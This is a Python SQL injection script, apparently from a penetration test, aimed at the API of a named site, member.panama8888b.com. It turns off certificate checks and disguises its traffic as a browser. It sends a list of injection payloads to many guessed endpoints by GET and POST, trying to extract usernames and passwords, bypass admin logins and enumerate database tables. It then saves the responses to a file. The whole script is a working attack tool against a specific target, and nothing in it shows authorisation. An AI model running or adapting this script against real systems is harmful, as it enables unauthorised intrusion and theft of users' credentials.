#!/usr/bin/env python3

"""
Correct User Data Extraction Script
Extract REAL user data from database, not from JavaScript file
Team B - Panama8888b Penetration Test
"""

import requests
import time
import urllib.parse
import json
import sys
import warnings
import re
from datetime import datetime

# Disable SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class CorrectUserExtractor:
    def __init__(self):
        # Target the actual API endpoint, not the JS file
        self.base_url = "https://member.panama8888b.com/api"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json',
            'Connection': 'keep-alive'
        })
        self.session.verify = False
        self.real_user_data = {}
        
    def extract_real_user_data(self, payload, description):
        """Extract REAL user data from database using proper SQL injection"""
        print(f"[*] Extracting: {description}")
        print(f"[*] Payload: {payload}")
        
        # Try different endpoints that might be vulnerable
        endpoints = [
            "/users",
            "/login", 
            "/auth",
            "/api/users",
            "/api/login",
            "/api/auth",
            "/card",  # From the original JS code
            "/public/api/users",
            "/public/api/login"
        ]
        
        for endpoint in endpoints:
            try:
                # Method 1: GET request with parameter injection
                encoded_payload = urllib.parse.quote(payload)
                url = f"{self.base_url}{endpoint}?id={encoded_payload}"
                
                print(f"[*] Trying GET: {url}")
                response = self.session.get(url, timeout=10)
                
                # Method 2: POST request with JSON injection
                if response.status_code == 200:
                    post_data = {
                        "id": payload,
                        "username": payload,
                        "user": payload
                    }
                    
                    post_url = f"{self.base_url}{endpoint}"
                    print(f"[*] Trying POST: {post_url}")
                    post_response = self.session.post(post_url, json=post_data, timeout=10)
                    
                    # Analyze both responses
                    responses = [response, post_response]
                else:
                    responses = [response]
                
                for resp in responses:
                    if resp.status_code in [200, 201, 500]:  # 500 might contain SQL errors
                        content = resp.text
                        
                        # Look for REAL database data, not JavaScript code
                        info = {
                            'endpoint': endpoint,
                            'method': 'GET' if resp == response else 'POST',
                            'status_code': resp.status_code,
                            'content_length': len(content),
                            'timestamp': datetime.now().isoformat(),
                            'real_user_data': {},
                            'sql_errors': [],
                            'database_indicators': []
                        }
                        
                        # Check for SQL errors that indicate real database access
                        sql_error_patterns = [
                            r'microsoft sql server',
                            r'sql server',
                            r'incorrect syntax',
                            r'unclosed quotation mark',
                            r'conversion failed',
                            r'division by zero',
                            r'arithmetic overflow',
                            r'string or binary data would be truncated',
                            r'cannot insert duplicate key',
                            r'foreign key constraint',
                            r'primary key constraint'
                        ]
                        
                        for pattern in sql_error_patterns:
                            matches = re.findall(pattern, content, re.IGNORECASE)
                            if matches:
                                info['sql_errors'].extend(matches)
                                print(f"[+] SQL ERROR FOUND: {matches}")
                        
                        # Look for REAL user data patterns
                        if 'admin' in content.lower() and len(content) < 10000:  # Avoid JS files
                            info['real_user_data']['admin_detected'] = True
                            print("[+] ADMIN USER DETECTED in response")
                        
                        if '1user' in content.lower() and len(content) < 10000:
                            info['real_user_data']['1user_detected'] = True
                            print("[+] 1USER DETECTED in response")
                        
                        # Look for JSON responses with user data
                        try:
                            json_data = resp.json()
                            if isinstance(json_data, dict):
                                if 'users' in json_data or 'user' in json_data or 'data' in json_data:
                                    info['real_user_data']['json_response'] = json_data
                                    print(f"[+] JSON RESPONSE: {json_data}")
                        except:
                            pass
                        
                        # Check for database indicators
                        db_indicators = [
                            'database',
                            'table',
                            'column',
                            'row',
                            'record',
                            'query',
                            'select',
                            'insert',
                            'update',
                            'delete'
                        ]
                        
                        for indicator in db_indicators:
                            if indicator in content.lower():
                                info['database_indicators'].append(indicator)
                        
                        # If we found meaningful data, save it
                        if info['sql_errors'] or info['real_user_data'] or info['database_indicators']:
                            self.real_user_data[f"{description}_{endpoint}"] = info
                            print(f"[+] MEANINGFUL DATA FOUND at {endpoint}")
                            return info
                
                time.sleep(1)  # Delay between endpoints
                
            except Exception as e:
                print(f"[!] Error with {endpoint}: {e}")
                continue
        
        return None
    
    def run_correct_extraction(self):
        """Run correct user data extraction"""
        print("="*70)
        print("CORRECT USER DATA EXTRACTION - REAL DATABASE ACCESS")
        print("Target: https://member.panama8888b.com/api")
        print("="*70)
        
        # Proper SQL injection payloads for user data
        user_payloads = [
            ("' OR 1=1 --", "Basic SQL Injection"),
            ("' UNION SELECT username FROM users --", "Extract Usernames"),
            ("' UNION SELECT password FROM users --", "Extract Passwords"),
            ("' UNION SELECT username,password FROM users --", "Extract Credentials"),
            ("' UNION SELECT * FROM users WHERE username='admin' --", "Extract Admin"),
            ("' UNION SELECT * FROM users WHERE username='1user' --", "Extract 1User"),
            ("' OR username='admin' --", "Admin Login Bypass"),
            ("' OR username='1user' --", "1User Login Bypass"),
            ("admin' --", "Admin Injection"),
            ("1user' --", "1User Injection"),
            ("' UNION SELECT name FROM sysobjects WHERE xtype='U' --", "List Tables"),
            ("' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --", "List All Tables"),
        ]
        
        print(f"\n[*] Running correct extraction with {len(user_payloads)} payloads...")
        print("[*] This will extract REAL user data from database, not JavaScript")
        
        for payload, description in user_payloads:
            result = self.extract_real_user_data(payload, description)
            if result:
                print(f"[+] SUCCESS: {description}")
                if result.get('real_user_data'):
                    print(f"[+] REAL DATA: {result['real_user_data']}")
                if result.get('sql_errors'):
                    print(f"[+] SQL ERRORS: {result['sql_errors']}")
            
            time.sleep(2)  # Delay between payloads
        
        # Summary
        print("\n" + "="*70)
        print("CORRECT EXTRACTION SUMMARY")
        print("="*70)
        
        if self.real_user_data:
            print("\n[+] REAL DATABASE ACCESS CONFIRMED!")
            print("[+] Found meaningful database responses")
            
            for key, data in self.real_user_data.items():
                print(f"\n[*] {key}:")
                if data.get('real_user_data'):
                    print(f"  Real Data: {data['real_user_data']}")
                if data.get('sql_errors'):
                    print(f"  SQL Errors: {data['sql_errors']}")
                if data.get('database_indicators'):
                    print(f"  DB Indicators: {data['database_indicators']}")
        else:
            print("\n[!] No real database access confirmed")
            print("[!] Target might be protected or endpoints not vulnerable")
        
        return self.real_user_data
    
    def save_correct_results(self, filename="correct_user_extraction_results.json"):
        """Save correct extraction results"""
        with open(filename, 'w') as f:
            json.dump(self.real_user_data, f, indent=2)
        print(f"\n[+] Correct extraction results saved to: {filename}")

def main():
    try:
        extractor = CorrectUserExtractor()
        results = extractor.run_correct_extraction()
        extractor.save_correct_results()
        
        if results:
            print("\n[+] Correct user data extraction completed!")
            print("[+] Real database access has been verified!")
        else:
            print("\n[!] No real database access confirmed")
        
    except KeyboardInterrupt:
        print("\n[!] Extraction interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()